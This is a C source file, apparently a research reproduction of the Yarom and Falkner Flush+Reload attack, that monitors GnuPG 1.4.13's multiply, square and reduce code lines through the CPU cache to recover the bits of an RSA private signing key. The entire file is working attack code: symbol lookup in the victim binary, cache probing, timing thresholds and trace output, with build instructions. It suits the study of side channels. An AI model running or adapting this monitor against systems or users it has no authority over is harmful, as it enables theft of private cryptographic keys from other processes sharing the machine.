/*
 * Flush+Reload monitor for GnuPG 1.4.13 RSA signing (Yarom & Falkner, USENIX'14).
 *
 * Monitors three code lines in GnuPG's bignum exponentiation and records, for
 * each time slot, whether each line was in the cache (victim executed it):
 *   Multiply  mpih-mul.c:85    Square  mpih-mul.c:271    Reduce  mpih-div.c:356
 * The sequence of Square / Multiply / Reduce operations reveals the bits of the
 * RSA private exponent (see decode.py).
 *
 * SLOT and THRESHOLD are machine-specific and are set by calibrate (run.sh
 * passes them via -D). The defaults below are only a fallback.
 *
 * Based on Mastik's demo/FR-gnupg-1.4.13.c (CSIRO, GPLv3). Standalone build:
 *   gcc -I mastik -o FR-attack src/FR-attack.c -L mastik/src -lmastik -ldwarf -lelf -lbfd
 */
#include "config.h"
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <mastik/symbol.h>
#include <mastik/fr.h>
#include <mastik/util.h>

#ifndef SAMPLES
#define SAMPLES 5000000      /* ~2 s of slots; spans many short signatures   */
#endif
#ifndef SLOT
#define SLOT    2500         /* cycles per slot; MUST exceed 3-probe time     */
#endif
#ifndef THRESHOLD
#define THRESHOLD 200        /* reload < THRESHOLD cycles == cache hit        */
#endif

char *monitor[] = {
  "mpih-mul.c:85",           /* Multiply */
  "mpih-mul.c:271",          /* Square   */
  "mpih-div.c:356"           /* Reduce   */
};
int nmonitor = sizeof(monitor)/sizeof(monitor[0]);

void usage(const char *prog) {
  fprintf(stderr, "Usage: %s <gpg-1.4.13-binary>\n", prog);
  exit(1);
}

int main(int ac, char **av) {
#ifdef HAVE_DEBUG_SYMBOLS
  char *binary = av[1];
  if (binary == NULL)
    usage(av[0]);

  fr_t fr = fr_prepare();
  for (int i = 0; i < nmonitor; i++) {
    uint64_t offset = sym_getsymboloffset(binary, monitor[i]);
    if (offset == ~0ULL) {
      fprintf(stderr, "Cannot find %s in %s (is it built -O0 with debug symbols?)\n",
              monitor[i], binary);
      exit(1);
    }
    fr_monitor(fr, map_offset(binary, offset));
  }

  uint16_t *res = malloc(SAMPLES * nmonitor * sizeof(uint16_t));
  for (int i = 0; i < SAMPLES * nmonitor ; i+= 4096/sizeof(uint16_t))
    res[i] = 1;
  fr_probe(fr, res);

  /* max_idle = SAMPLES: never stop early, so we capture across many signatures */
  int l = fr_trace(fr, SAMPLES, res, SLOT, THRESHOLD, SAMPLES);
  for (int i = 0; i < l; i++) {
    for (int j = 0; j < nmonitor; j++)
      printf("%d ", res[i * nmonitor + j]);
    putchar('\n');
  }

  free(res);
  fr_release(fr);
#else
  fprintf(stderr, "%s: Mastik built without debug-symbol support "
                  "(install binutils-dev / libdwarf-dev / libelf-dev)\n", av[0]);
  exit(1);
#endif
}
